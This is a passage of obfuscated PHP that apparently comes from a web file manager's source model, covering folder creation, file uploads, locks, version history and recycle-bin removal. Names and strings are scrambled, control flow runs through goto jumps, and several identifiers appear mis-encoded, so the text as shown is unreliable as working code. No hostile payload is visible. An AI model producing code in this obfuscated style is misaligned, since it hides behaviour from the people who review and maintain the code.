$Fæø£×äÎ[123]) || substr($E¼ª÷·‘‚á, 0, 1) == $Fæø£×äÎ[55] && substr($E¼ª÷·‘‚á, -1) == $Fæø£×äÎ[55]) { $E¼ª÷·‘‚á = substr($E¼ª÷·‘‚á, 1, -1); $A»É®Øá² = array($E¼ª÷·‘‚á); } $Fö¸Õ–„ÜÕ[$Fæø£×äÎ[28]] = array($Fæø£×äÎ[491], $Fæø£×äÎ[2185] . $E¼ª÷·‘‚á . $Fæø£×äÎ[2185]); if (count($A»É®Øá²) > 1) { $Fö¸Õ–„ÜÕ[$Fæø£×äÎ[28]] = array(); foreach ($A»É®Øá² as $AÑ©³Ú¹÷Œ) { if (!trim($AÑ©³Ú¹÷Œ)) { continue; } $Fö¸Õ–„ÜÕ[$Fæø£×äÎ[28]][] = array($Fæø£×äÎ[491], $Fæø£×äÎ[2185] . trim($AÑ©³Ú¹÷Œ) . $Fæø£×äÎ[2185]); } } } return $Fö¸Õ–„ÜÕ; goto c…¬Ôùî÷“; aª‡¤×¨õ–: $Fæø£×äÎ =& $_SERVER[¶ªÕß‚ØÁŸ]; $Fö¸Õ–„ÜÕ = array(); if (isset($E©˜Œ£Ç‡[$Fæø£×äÎ[715]])) { $Fö¸Õ–„ÜÕ[$Fæø£×äÎ[117]] = array($Fæø£×äÎ[2325], $E©˜Œ£Ç‡[$Fæø£×äÎ[715]]); } goto fØš¼æ·¤Ò; fØš¼æ·¤Ò: if (isset($E©˜Œ£Ç‡[$Fæø£×äÎ[716]])) { $Aè¿õ•ë¨ = array($Fæø£×äÎ[2326], $E©˜Œ£Ç‡[$Fæø£×äÎ[716]]); if ($Fö¸Õ–„ÜÕ[$Fæø£×äÎ[117]]) { $Fö¸Õ–„ÜÕ[$Fæø£×äÎ[117]] = array($Fö¸Õ–„ÜÕ[$Fæø£×äÎ[117]], $Aè¿õ•ë¨, $Fæø£×äÎ[2327]); } else { $Fö¸Õ–„ÜÕ[$Fæø£×äÎ[117]] = $Aè¿õ•ë¨; } } if (isset($E©˜Œ£Ç‡[$Fæø£×äÎ[2328]])) { $Fö¸Õ–„ÜÕ[$Fæø£×äÎ[87]] = array($Fæø£×äÎ[2325], $E©˜Œ£Ç‡[$Fæø£×äÎ[2328]]); } if (isset($E©˜Œ£Ç‡[$Fæø£×äÎ[2329]])) { $Aè¿õ•ë¨ = array($Fæø£×äÎ[2326], $E©˜Œ£Ç‡[$Fæø£×äÎ[2329]]); if ($Fö¸Õ–„ÜÕ[$Fæø£×äÎ[87]]) { $Fö¸Õ–„ÜÕ[$Fæø£×äÎ[87]] = array($Fö¸Õ–„ÜÕ[$Fæø£×äÎ[87]], $Aè¿õ•ë¨, $Fæø£×äÎ[2327]); } else { $Fö¸Õ–„ÜÕ[$Fæø£×äÎ[87]] = $Aè¿õ•ë¨; } } goto aÁÓ—Ò… ; aÁÓ—Ò… : if (isset($E©˜Œ£Ç‡[$Fæø£×äÎ[543]])) { $Fö¸Õ–„ÜÕ[] = array($Fæø£×äÎ[387] => $E©˜Œ£Ç‡[$Fæø£×äÎ[543]], $Fæø£×äÎ[386] => $E©˜Œ£Ç‡[$Fæø£×äÎ[543]], $Fæø£×äÎ[920] => $Fæø£×äÎ[2187]); } if (isset($E©˜Œ£Ç‡[$Fæø£×äÎ[380]])) { $aÍ½Ùœô· = $E©˜Œ£Ç‡[$Fæø£×äÎ[380]]; if ($aÍ½Ùœô· == $Fæø£×äÎ[86]) { $Fö¸Õ–„ÜÕ[$Fæø£×äÎ[378]] = 1; } else { if ($aÍ½Ùœô· == $Fæø£×äÎ[2330]) { $Fö¸Õ–„ÜÕ[$Fæø£×äÎ[378]] = 0; } else { if ($aÍ½Ùœô·) { $aÍ½Ùœô· = is_array($aÍ½Ùœô·) ? $aÍ½Ùœô· : explode($Fæø£×äÎ[47], $aÍ½Ùœô·); $Fö¸Õ–„ÜÕ[$Fæø£×äÎ[380]] = array($Fæø£×äÎ[392], $aÍ½Ùœô·); $Fö¸Õ–„ÜÕ[$Fæø£×äÎ[378]] = 0; } } } } if (isset($E©˜Œ£Ç‡[$Fæø£×äÎ[469]])) { $F‘…ßëÄ¢ƒ = $this->sourceInfo($E©˜Œ£Ç‡[$Fæø£×äÎ[469]]); $Fö¸Õ–„ÜÕ[$Fæø£×äÎ[533]] = array($Fæø£×äÎ[491], $F‘…ßëÄ¢ƒ[$Fæø£×äÎ[467]] . $E©˜Œ£Ç‡[$Fæø£×äÎ[469]] . $Fæø£×äÎ[492]); } goto eÃæÊ±ºØ; c…¬Ôùî÷“: } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($dĞÙ´À˜ìÓ) { $DóØÀÔŠ•ï =& $_SERVER[¶ªÕß‚ØÁŸ]; $fÉ‹Û“Ä½´ = Model($DóØÀÔŠ•ï[482])->where(array($DóØÀÔŠ•ï[1431] => $dĞÙ´À˜ìÓ))->find(); $Eñ†„ÂÃÕõ = $this->_mkdirRoot(SourceModel::TYPE_USER, $dĞÙ´À˜ìÓ, $fÉ‹Û“Ä½´[$DóØÀÔŠ•ï[28]]); $this->userDesktopAdd($Eñ†„ÂÃÕõ); return $Eñ†„ÂÃÕõ; } public function userDesktopAdd($CìÈÅ•·›) { $dÀ¾ç¤¤ =& $_SERVER[¶ªÕß‚ØÁŸ]; $FÇ¼ ¾áÓÇ = LNG($dÀ¾ç¤¤[2331]); $DÌïõ‹¢ø = $this->mkdir($CìÈÅ•·›, $FÇ¼ ¾áÓÇ); $this->metaSet($DÌïõ‹¢ø, $dÀ¾ç¤¤[2332], $dÀ¾ç¤¤[93]); $this->metaSet($CìÈÅ•·›, $dÀ¾ç¤¤[2333], $DÌïõ‹¢ø); } public function groupRootAdd($Dë‘™Â¿¤²) { $dã¿¦Ñ½ñ =& $_SERVER[¶ªÕß‚ØÁŸ]; $f—ÒÎ–‰“ = Model($dã¿¦Ñ½ñ[466])->where(array($dã¿¦Ñ½ñ[2179] => $Dë‘™Â¿¤²))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $Dë‘™Â¿¤², $f—ÒÎ–‰“[$dã¿¦Ñ½ñ[28]]); } public function systemRootPathAdd($C‹¾´Ä–¬®) { if ($C‹¾´Ä–¬® != $_SERVER[¶ªÕß‚ØÁŸ][1093]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $C‹¾´Ä–¬®); } public function userRootRemove($fñŠçØğ²¤) { $a½¸–ÔÉæ¡ = $this->sourceRoot(SourceModel::TYPE_USER, $fñŠçØğ²¤); if (!$a½¸–ÔÉæ¡) { return; } $this->remove($a½¸–ÔÉæ¡, !1); } public function groupRootRemove($fÛÛÎÙ) { $a¶Ô×ˆ…†Ï = $this->sourceRoot(SourceModel::TYPE_GROUP, $fÛÛÎÙ); if (!$a¶Ô×ˆ…†Ï) { return; } $this->remove($a¶Ô×ˆ…†Ï, !1); } private function _mkdirRoot($b•Ä£¤„Š, $A§Î¶…ÖŸ´, $eÄ‚ËÅÆÑ™) { goto C’¾Í°¼£Õ; C’¾Í°¼£Õ: $eÆ‘ñğ’Üè =& $_SERVER[¶ªÕß‚ØÁŸ]; $dÑİ£èÜòŠ = array($eÆ‘ñğ’Üè[376] => 0, $eÆ‘ñğ’Üè[529] => $b•Ä£¤„Š, $eÆ‘ñğ’Üè[530] => $A§Î¶…ÖŸ´, $eÆ‘ñğ’Üè[526] => 1, $eÆ‘ñğ’Üè[531] => USER_ID, $eÆ‘ñğ’Üè[532] => USER_ID, $eÆ‘ñğ’Üè[527] => $eÆ‘ñğ’Üè[33], $eÆ‘ñğ’Üè[533] => $eÆ‘ñğ’Üè[478], $eÆ‘ñğ’Üè[404] => 0, $eÆ‘ñğ’Üè[528] => 0, $eÆ‘ñğ’Üè[428] => 0, $eÆ‘ñğ’Üè[534] => $eÆ‘ñğ’Üè[33]); if ($a’¥©ØÅ’Ğ = $this->where($dÑİ£èÜòŠ)->find()) { return $a’¥©ØÅ’Ğ[$eÆ‘ñğ’Üè[377]]; } goto eÜ¦³º´É‚; eÜ¦³º´É‚: $d¢²ŠÅøåæ = "\x4d\x6f\144\145\x6c\123\157\x75\x72\x63\145\56\155\153\144\151\x72\x52\157\157\164\56{$b•Ä£¤„Š}\56{$A§Î¶…ÖŸ´}\x2e" . $eÄ‚ËÅÆÑ™; CacheLock::lock($d¢²ŠÅøåæ); $dÑİ£èÜòŠ[$eÆ‘ñğ’Üè[28]] = $eÄ‚ËÅÆÑ™; goto Bº¶©ß¬¼ã; Fº„Ğøí: CacheLock::unlock($d¢²ŠÅøåæ); return $b·ƒÁÕÆÍ•; goto C–®ê“ •ß; Bº¶©ß¬¼ã: $b·ƒÁÕÆÍ• = $this->add($dÑİ£èÜòŠ); $dá©¿¾í‰á = array($eÆ‘ñğ’Üè[535] => short_id($b·ƒÁÕÆÍ•)); $this->where(array($eÆ‘ñğ’Üè[391] => $b·ƒÁÕÆÍ•))->save($dá©¿¾í‰á); goto Fº„Ğøí; C–®ê“ •ß: } private function sourceRoot($eùõÕ‘±…ê, $eó‰‰§¤ƒ, $A®í —Àî = false) { $b«ŠêƒÅõ‰ =& $_SERVER[¶ªÕß‚ØÁŸ]; $aÁËÊ³ÖÉ = array($b«ŠêƒÅõ‰[376] => 0, $b«ŠêƒÅõ‰[529] => $eùõÕ‘±…ê, $b«ŠêƒÅõ‰[530] => $eó‰‰§¤ƒ); if ($F‡¿Ñ¨Â” = $this->where($aÁËÊ³ÖÉ)->find()) { return $A®í —Àî ? $F‡¿Ñ¨Â” : $F‡¿Ñ¨Â”[$b«ŠêƒÅõ‰[377]]; } return !1; } public function sourceRootGroup($B³îğ°µˆ) { $E‡ßğƒÕ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (is_string($B³îğ°µˆ)) { $B³îğ°µˆ = array($B³îğ°µˆ); } $bÀâõâÑÏ = array($E‡ßğƒÕ[376] => 0, $E‡ßğƒÕ[529] => SourceModel::TYPE_GROUP, $E‡ßğƒÕ[530] => array($E‡ßğƒÕ[7], $B³îğ°µˆ)); $E­‹À»êŸœ = $this->listSource($bÀâõâÑÏ, 1000); return array_to_keyvalue($E­‹À»êŸœ[$E‡ßğƒÕ[84]], $E‡ßğƒÕ[464]); } public function mkfile($c©å¾Ô¹Èê, $Aœ³Â£ÖõÌ, $b„ğÍˆÍ½§ = '', $cïÔğ‚…ğ… = REPEAT_RENAME) { $a¼ÜÁ¡è‹Ş =& $_SERVER[¶ªÕß‚ØÁŸ]; $Aª±ó óîÛ = Model($a¼ÜÁ¡è‹Ş[552])->addFileByContent($b„ğÍˆÍ½§, $Aœ³Â£ÖõÌ); return $this->_createFileCall($c©å¾Ô¹Èê, $Aœ³Â£ÖõÌ, $Aª±ó óîÛ, $cïÔğ‚…ğ…, $a¼ÜÁ¡è‹Ş[1129]); } public function addFile($Fƒ¾ôŒÒË¤, $dÊƒ »ÔÚ, $EŸçµìßÛä, $Eå¾¸õª´ê = false, $Eî×’­Œ· = REPEAT_RENAME) { $c¡ï—ĞäÆâ = Model($_SERVER[¶ªÕß‚ØÁŸ][552])->addFile($dÊƒ »ÔÚ, $EŸçµìßÛä, $Eå¾¸õª´ê); return $this->_createFileCall($Fƒ¾ôŒÒË¤, $EŸçµìßÛä, $c¡ï—ĞäÆâ, $Eî×’­Œ·); } public function addFileByFileID($eÑô£™äã¬, $fà¤ÖÒïÑ», $bé˜„ÇçµÂ, $A×Ö™œ†¾‡ = REPEAT_RENAME) { $FÔÜÇ‹ƒÈ» =& $_SERVER[¶ªÕß‚ØÁŸ]; $BôíÃÂåòˆ = Model($FÔÜÇ‹ƒÈ»[552])->find($fà¤ÖÒïÑ»); Model($FÔÜÇ‹ƒÈ»[552])->linkAdd($fà¤ÖÒïÑ»); return $this->_createFileCall($eÑô£™äã¬, $bé˜„ÇçµÂ, $BôíÃÂåòˆ, $A×Ö™œ†¾‡); } public function addFileByRemote($b¶ñÃ†ÓÛÎ, $FÔ²¦íò…‘, $DÉë³Ïõâ, $D«Ì„‚¶é† = array(), $E‰ù’ŞÇ†˜ = REPEAT_RENAME) { $D°‡™áØ‹ù = Model($_SERVER[¶ªÕß‚ØÁŸ][552])->addFileByRemote($FÔ²¦íò…‘, $DÉë³Ïõâ, $D«Ì„‚¶é†); return $this->_createFileCall($b¶ñÃ†ÓÛÎ, $DÉë³Ïõâ, $D°‡™áØ‹ù, $E‰ù’ŞÇ†˜); } private function _createFileCall($cïË´ß•¶Õ, $FõœÄÕÜ, $Fòéø‰«Çâ, $eœ¡ŞÌƒÓÁ, $f°À“Úºí = "\165\160\154\157\141\144") { goto C®î÷†íŒ; e»ÙåÃ¼Á›: $DªÓôöÂğ† = $this->_createFile($cïË´ß•¶Õ, $FõœÄÕÜ, $Fòéø‰«Çâ, $eœ¡ŞÌƒÓÁ, $f¦È¶â×À¯); if (!$f¦È¶â×À¯) { Model($a‡Ì¾Å‡”Ñ[430])->remove($Fòéø‰«Çâ[$a‡Ì¾Å‡”Ñ[427]]); } else { if ($DªÓôöÂğ†) { Model($a‡Ì¾Å‡”Ñ[2304])->eventCreate($DªÓôöÂğ†, $f°À“Úºí); } } $this->lockWriteEnd($cïË´ß•¶Õ, $FõœÄÕÜ); goto dİˆ¾£Ò“; dİˆ¾£Ò“: return $DªÓôöÂğ†; goto cåÅë²ö‘; C®î÷†íŒ: $a‡Ì¾Å‡”Ñ =& $_SERVER[¶ªÕß‚ØÁŸ]; $f¦È¶â×À¯ = !1; $this->lockWriteStart($cïË´ß•¶Õ, $FõœÄÕÜ); goto e»ÙåÃ¼Á›; cåÅë²ö‘: } public function mkdir($a™‰éÙâÛ, $D¡ËÍ…¶ö«, $dÕÙÖ¨ôìÉ = REPEAT_SKIP) { goto D‡µ»Û»÷Œ; Dğ†§ÈÚñÁ: $BµÔ‚­ Ü’ = $this->_addSoure($Bª‹±àº¾, $c’º©®áÌç); Model($E½¥•šé¤[2304])->eventCreate($BµÔ‚­ Ü’, $E½¥•šé¤[1130]); $this->lockWriteEnd($a™‰éÙâÛ, $D¡ËÍ…¶ö«); goto e×´„Ùõº¦; D‡µ»Û»÷Œ: $E½¥•šé¤ =& $_SERVER[¶ªÕß‚ØÁŸ]; $c’º©®áÌç = $this->sourceInfo($a™‰éÙâÛ); if (!$c’º©®áÌç) { return !1; } goto a¶±ƒÅ´ß; a¶±ƒÅ´ß: $this->lockWriteStart($a™‰éÙâÛ, $D¡ËÍ…¶ö«); if ($dÕÙÖ¨ôìÉ !== !1) { $E ‡õ³²¢Å = $this->fileNameExist($a™‰éÙâÛ, $D¡ËÍ…¶ö«); if ($E ‡õ³²¢Å && $dÕÙÖ¨ôìÉ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($a™‰éÙâÛ, $D¡ËÍ…¶ö«); return $E ‡õ³²¢Å; } $D¡ËÍ…¶ö« = $this->fileNameAuto($a™‰éÙâÛ, $D¡ËÍ…¶ö«, $dÕÙÖ¨ôìÉ); } $Bª‹±àº¾ = array($E½¥•šé¤[526] => 1, $E½¥•šé¤[394] => $D¡ËÍ…¶ö«, $E½¥•šé¤[527] => $E½¥•šé¤[33], $E½¥•šé¤[428] => 0, $E½¥•šé¤[528] => 0); goto Dğ†§ÈÚñÁ; e×´„Ùõº¦: return $BµÔ‚­ Ü’; goto CÖ×ÂĞ«ˆ¬; CÖ×ÂĞ«ˆ¬: } private function _createFile($DÂ¬Âîò°, $cˆ‚Á»¶¥¢, $cğĞ ¥…é†, $Aöí¡µÑÖŸ, &$f·Ø»“½‡) { goto dé™ÂÍÙã; d…á±Ñ¹İ’: $FÕ“éğÕ­ = array($fˆÔÚŠ‡ØÂ[526] => 0, $fˆÔÚŠ‡ØÂ[394] => $cˆ‚Á»¶¥¢, $fˆÔÚŠ‡ØÂ[527] => get_path_ext($cˆ‚Á»¶¥¢), $fˆÔÚŠ‡ØÂ[428] => $cğĞ ¥…é†[$fˆÔÚŠ‡ØÂ[427]], $fˆÔÚŠ‡ØÂ[528] => $cğĞ ¥…é†[$fˆÔÚŠ‡ØÂ[87]]); $d—á…™¼Ş¿ = $this->_addSoure($FÕ“éğÕ­, $D¶ìà¥àì§); $this->folderSizeReset($DÂ¬Âîò°); goto döÛÌÈ´åÃ; dé™ÂÍÙã: $fˆÔÚŠ‡ØÂ =& $_SERVER[¶ªÕß‚ØÁŸ]; $D¶ìà¥àì§ = $this->sourceInfo($DÂ¬Âîò°); if (!$cğĞ ¥…é† || !$D¶ìà¥àì§) { return !1; } goto AóÓàñ¤³; AóÓàñ¤³: if ($Aöí¡µÑÖŸ !== !1) { $AÉ²´«èà = $this->fileNameExist($DÂ¬Âîò°, $cˆ‚Á»¶¥¢); } $f·Ø»“½‡ = !0; if ($Aöí¡µÑÖŸ && $AÉ²´«èà) { if ($Aöí¡µÑÖŸ == REPEAT_SKIP) { $f·Ø»“½‡ = !1; return $AÉ²´«èà; } else { if ($Aöí¡µÑÖŸ == REPEAT_REPLACE) { $d’ÃªÂ‚ = $this->sourceInfo($AÉ²´«èà); $DÂ‰—İ›ñ… = $this->fileHistory($d’ÃªÂ‚, $cğĞ ¥…é†[$fˆÔÚŠ‡ØÂ[427]], $cğĞ ¥…é†[$fˆÔÚŠ‡ØÂ[87]]); if (!$DÂ‰—İ›ñ…) { $f·Ø»“½‡ = !1; } else { $this->folderSizeReset($DÂ¬Âîò°); } return $AÉ²´«èà; } else { $cˆ‚Á»¶¥¢ = $this->fileNameAuto($DÂ¬Âîò°, $cˆ‚Á»¶¥¢, $Aöí¡µÑÖŸ, !1); } } } goto d…á±Ñ¹İ’; döÛÌÈ´åÃ: return $d—á…™¼Ş¿; goto A“Æ†…Ô…¤; A“Æ†…Ô…¤: } protected function fileHistory($cÎŞç®âæ”, $B‘»ª¯Î¸ô, $AôŠùË‰) { goto féä„êÚ¦; b—‰Î¨ø°ê: Model($f¾â»»­ ï[2334])->addHistory($cÎŞç®âæ”); $e¿Ôİ¯Õ = array($f¾â»»­ ï[532] => USER_ID, $f¾â»»­ ï[398] => time(), $f¾â»»­ ï[427] => $B‘»ª¯Î¸ô, $f¾â»»­ ï[87] => $AôŠùË‰); $this->where(array($f¾â»»­ ï[391] => $cÎŞç®âæ”[$f¾â»»­ ï[377]]))->save($e¿Ôİ¯Õ); goto CÓˆêœ‰õÉ; CÓˆêœ‰õÉ: return !0; goto BÚÏ¦£Ä; féä„êÚ¦: $f¾â»»­ ï =& $_SERVER[¶ªÕß‚ØÁŸ]; if ($cÎŞç®âæ”[$f¾â»»­ ï[427]] == $B‘»ª¯Î¸ô) { return !1; } $this->checkLock($cÎŞç®âæ”[$f¾â»»­ ï[377]], $B‘»ª¯Î¸ô); goto b—‰Î¨ø°ê; BÚÏ¦£Ä: } public function checkLock($dùÔèÓ¤¸, $DÇ‚Ò»Õ¯•) { goto e‡Ç¬çãŠÃ; aˆÅÏÈ¦Ê¤: show_json(LNG($EŒ¹ø†‘Ò¬[2337]) . $EŒ¹ø†‘Ò¬[2338] . LNG($EŒ¹ø†‘Ò¬[2339]) . $EŒ¹ø†‘Ò¬[2340] . $eÓŸÁ…ÔË . $EŒ¹ø†‘Ò¬[2341], !1); goto a–ŒË£‡Ğä; F’Ôòõ‹‹Ô: $this->_createFileCall($Eßä­Ìñº†[$EŒ¹ø†‘Ò¬[469]], $Cê–‡Ü’ÃØ, $DØÀë‰Š¸Ê, REPEAT_REPLACE, $EŒ¹ø†‘Ò¬[1129]); $a…¢âŠ¦ = $Eßä­Ìñº†[$EŒ¹ø†‘Ò¬[425]][$EŒ¹ø†‘Ò¬[489]]; $eÓŸÁ…ÔË = $a…¢âŠ¦[$EŒ¹ø†‘Ò¬[2336]] ? $a…¢âŠ¦[$EŒ¹ø†‘Ò¬[2336]] : $a…¢âŠ¦[$EŒ¹ø†‘Ò¬[28]]; goto aˆÅÏÈ¦Ê¤; Cìé™‹ß“: $BÀ’äé‡ƒ× = Session::get($EŒ¹ø†‘Ò¬[2335]); $Cê–‡Ü’ÃØ = substr($Eßä­Ìñº†[$EŒ¹ø†‘Ò¬[28]], 0, -1 - strlen($Eßä­Ìñº†[$EŒ¹ø†‘Ò¬[170]])) . $EŒ¹ø†‘Ò¬[1393] . $BÀ’äé‡ƒ× . $EŒ¹ø†‘Ò¬[101] . $Eßä­Ìñº†[$EŒ¹ø†‘Ò¬[170]]; $DØÀë‰Š¸Ê = Model($EŒ¹ø†‘Ò¬[552])->find($DÇ‚Ò»Õ¯•); goto F’Ôòõ‹‹Ô; e‡Ç¬çãŠÃ: $EŒ¹ø†‘Ò¬ =& $_SERVER[¶ªÕß‚ØÁŸ]; $Eßä­Ìñº† = $this->pathInfo($dùÔèÓ¤¸); if (!$this->fileIsLock($Eßä­Ìñº†, !0)) { return; } goto Cìé™‹ß“; a–ŒË£‡Ğä: } public function fileIsLock($aëõ–İÕ, $B‡Á°·Ñİ• = false) { goto Cƒ®ºë›„ç; d èÚµ®Ğ: $DÚ¨¹«ëÛ« = $GLOBALS[$CªøÕ©Ñó[6]][$CªøÕ©Ñó[94]][$CªøÕ©Ñó[487]]; if ($aëõ–İÕ[$CªøÕ©Ñó[425]][$CªøÕ©Ñó[488]] <= time() - $DÚ¨¹«ëÛ«) { $this->metaSet($aëõ–İÕ[$CªøÕ©Ñó[377]], $CªøÕ©Ñó[486], null); $this->metaSet($aëõ–İÕ[$CªøÕ©Ñó[377]], $CªøÕ©Ñó[488], null); } if ($B‡Á°·Ñİ•) { $this->metaSet($aëõ–İÕ[$CªøÕ©Ñó[377]], $CªøÕ©Ñó[488], time()); } goto Eâ÷ĞÓƒòº; Eâ÷ĞÓƒòº: return !1; goto a¨¤ŸŸÁœÔ; Cƒ®ºë›„ç: $CªøÕ©Ñó =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!isset($aëõ–İÕ[$CªøÕ©Ñó[425]]) || !$aëõ–İÕ[$CªøÕ©Ñó[425]][$CªøÕ©Ñó[486]]) { return !1; } if ($aëõ–İÕ[$CªøÕ©Ñó[425]][$CªøÕ©Ñó[486]] != USER_ID) { return !0; } goto d èÚµ®Ğ; a¨¤ŸŸÁœÔ: } private function _addSoure($EíõÜäÔÅê, $d„øÔÒèÂº) { goto F™¿™¥®Ğ; d¦¥×Ñ‰“Ë: $C§¨Í‹‚Ú = array($B¶Ê¦Ê‹¤È[535] => short_id($DáˆÇÁá§ô)); $this->where(array($B¶Ê¦Ê‹¤È[391] => $DáˆÇÁá§ô))->save($C§¨Í‹‚Ú); $this->setNamePinyin($DáˆÇÁá§ô, $EíõÜäÔÅê[$B¶Ê¦Ê‹¤È[28]]); goto b›ˆ—æñ¯³; F™¿™¥®Ğ: $B¶Ê¦Ê‹¤È =& $_SERVER[¶ªÕß‚ØÁŸ]; $DË³øÜ¾ñ = array($B¶Ê¦Ê‹¤È[529] => $d„øÔÒèÂº[$B¶Ê¦Ê‹¤È[379]], $B¶Ê¦Ê‹¤È[530] => $d„øÔÒèÂº[$B¶Ê¦Ê‹¤È[464]], $B¶Ê¦Ê‹¤È[531] => USER_ID, $B¶Ê¦Ê‹¤È[532] => USER_ID, $B¶Ê¦Ê‹¤È[376] => $d„øÔÒèÂº[$B¶Ê¦Ê‹¤È[377]], $B¶Ê¦Ê‹¤È[533] => $d„øÔÒèÂº[$B¶Ê¦Ê‹¤È[467]] . $d„øÔÒèÂº[$B¶Ê¦Ê‹¤È[377]] . $B¶Ê¦Ê‹¤È[47], $B¶Ê¦Ê‹¤È[404] => 0, $B¶Ê¦Ê‹¤È[534] => $B¶Ê¦Ê‹¤È[33]); $EíõÜäÔÅê = array_merge($DË³øÜ¾ñ, $EíõÜäÔÅê); goto a»½¢Í”®; a»½¢Í”®: $this->updateModifyTime($EíõÜäÔÅê[$B¶Ê¦Ê‹¤È[469]]); $FÂ©ˆ«‹ìõ = $B¶Ê¦Ê‹¤È[2342] . $d„øÔÒèÂº[$B¶Ê¦Ê‹¤È[377]]; if (isset(self::$cacheChildList[$FÂ©ˆ«‹ìõ])) { unset(self::$cacheChildList[$FÂ©ˆ«‹ìõ]); } goto Dé´ëë”„Á; Dé´ëë”„Á: static $A’ö®¦İŒ… = false; if (!$A’ö®¦İŒ…) { Hook::trigger($B¶Ê¦Ê‹¤È[516], $EíõÜäÔÅê); $A’ö®¦İŒ… = !0; } $DáˆÇÁá§ô = $this->add($EíõÜäÔÅê); goto d¦¥×Ñ‰“Ë; b›ˆ—æñ¯³: return $DáˆÇÁá§ô; goto fŒĞŒ¤“Ê¶; fŒĞŒ¤“Ê¶: } public function remove($Dˆ´„æÌöô, $eöÇØ˜ë·İ = true) { goto F¹ƒô¶¬£™; C†¿Õ‚‚•: $this->recycleClear($d“Î­ßŠ); $d’‘®¤—… = $this->move($Dˆ´„æÌöô, $CÂ±á¡›ø, REPEAT_RENAME_FOLDER); $this->folderSizeReset($d“Î­ßŠ[$Aö¹ñŒæ£ª[469]]); goto FæÎÙ×İç; F¹ƒô¶¬£™: $Aö¹ñŒæ£ª =& $_SERVER[¶ªÕß‚ØÁŸ]; $d“Î­ßŠ = $this->sourceInfo($Dˆ´„æÌöô); $dÅÛÁ‚÷ = intval($d“Î­ßŠ[$Aö¹ñŒæ£ª[379]]) === self::TYPE_SYSTEM; goto e•é­š˜Ï; a¤‚¬ìòíº: $AØŠĞƒˆõ = $d“Î­ßŠ[$Aö¹ñŒæ£ª[379]] == self::TYPE_USER ? $Aö¹ñŒæ£ª[543] : $Aö¹ñŒæ£ª[977]; if ($AØŠĞƒˆõ == $Aö¹ñŒæ£ª[543]) { $Dğ£ãñÊ–ß = Model($Aö¹ñŒæ£ª[482])->getInfo($d“Î­ßŠ[$Aö¹ñŒæ£ª[464]]); $e—³µÒŠ¬² = !empty($Dğ£ãñÊ–ß[$Aö¹ñŒæ£ª[2336]]) ? $Dğ£ãñÊ–ß[$Aö¹ñŒæ£ª[2336]] : $Dğ£ãñÊ–ß[$Aö¹ñŒæ£ª[28]]; $e—³µÒŠ¬² = $Aö¹ñŒæ£ª[257] . $e—³µÒŠ¬² . $Aö¹ñŒæ£ª[2344] . $d“Î­ßŠ[$Aö¹ñŒæ£ª[464]]; } else { $Dğ£ãñÊ–ß = Model($Aö¹ñŒæ£ª[466])->getInfo($d“Î­ßŠ[$Aö¹ñŒæ£ª[464]]); $e—³µÒŠ¬² = _get($Dğ£ãñÊ–ß, $Aö¹ñŒæ£ª[28]); $e—³µÒŠ¬² = $Aö¹ñŒæ£ª[167] . $e—³µÒŠ¬² . $Aö¹ñŒæ£ª[2345] . $d“Î­ßŠ[$Aö¹ñŒæ£ª[464]]; } $Eİà¬’ˆŸ = $Aö¹ñŒæ£ª[2346] . md5($e—³µÒŠ¬²); goto E¦Ù…ÜÉã¸; a†‘À¥¬øÂ: CacheLock::unlock($Eİà¬’ˆŸ); $this->metaSet($Dˆ´„æÌöô, $Aö¹ñŒæ£ª[2351], $d“Î­ßŠ[$Aö¹ñŒæ£ª[469]]); $this->where(array($Aö¹ñŒæ£ª[377] => $Dˆ´„æÌöô))->save(array($Aö¹ñŒæ£ª[398] => time())); goto C†¿Õ‚‚•; FæÎÙ×İç: return $d’‘®¤—…; goto AŠ‡Åë×¼ö; e•é­š˜Ï: $d­èœ¯Ó¢ = Model($Aö¹ñŒæ£ª[1438])->get($Aö¹ñŒæ£ª[2343]) == $Aö¹ñŒæ£ª[93]; if ($dÅÛÁ‚÷ || $eöÇØ˜ë·İ || !$d­èœ¯Ó¢) { return $this->removeNow($Dˆ´„æÌöô, $eöÇØ˜ë·İ); } $a•´¾¦ô¡´ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto a¤‚¬ìòíº; E¦Ù…ÜÉã¸: CacheLock::lock($Eİà¬’ˆŸ); $CÂ±á¡›ø = $this->fileNameExist($a•´¾¦ô¡´, $e—³µÒŠ¬²); if (!$CÂ±á¡›ø) { $CÂ±á¡›ø = $this->mkdir($a•´¾¦ô¡´, $e—³µÒŠ¬², REPEAT_SKIP); $this->metaSet($CÂ±á¡›ø, $Aö¹ñŒæ£ª[2347], $AØŠĞƒˆõ); $this->metaSet($CÂ±á¡›ø, $Aö¹ñŒæ£ª[2348], $d“Î­ßŠ[$Aö¹ñŒæ£ª[464]]); if ($d“Î­ßŠ[$Aö¹ñŒæ£ª[469]] != 0) { $this->metaSet($CÂ±á¡›ø, $Aö¹ñŒæ£ª[2349], _get($Dğ£ãñÊ–ß, $Aö¹ñŒæ£ª[2350])); } } goto a†‘À¥¬øÂ; AŠ‡Åë×¼ö: } private function recycleClear($bÂ÷†Ë‰•°) { $a¬Œ­¹öŸ =& $_SERVER[¶ªÕß‚ØÁŸ]; $fœ“”ÂƒË = $this->childrenAll($bÂ÷†Ë‰•°); $BÌ¨ŸÓñ”™ = array($a¬Œ­¹öŸ[391] => array($a¬Œ­¹öŸ[392], $fœ“”ÂƒË[$a¬Œ­¹öŸ[2352]])); Model($a¬Œ­¹öŸ[2353])->where($BÌ¨ŸÓñ”™)->delete(); } public function removeNow($cŞ™Œö°µ, $f°œ–ó¾Í = true) { goto eÚÍ¢à›ã¤; DÎòîâĞŸ: $aøè„œœÜ… = array($FÆåÌ‹ÀÒ[$b¹ÖÄÉÁŸÏ[469]]); if ($FÆåÌ‹ÀÒ[$b¹ÖÄÉÁŸÏ[378]] == $b¹ÖÄÉÁŸÏ[93]) { $aøè„œœÜ…[] = $FÆåÌ‹ÀÒ[$b¹ÖÄÉÁŸÏ[377]]; } $this->updateModifyTime($aøè„œœÜ…); goto C¢ÂùÊİó”; a·®½‘Û£›: if (!$FÆåÌ‹ÀÒ) { return !0; } if ($FÆåÌ‹ÀÒ[$b¹ÖÄÉÁŸÏ[469]] == 0) { if (!_get($GLOBALS, 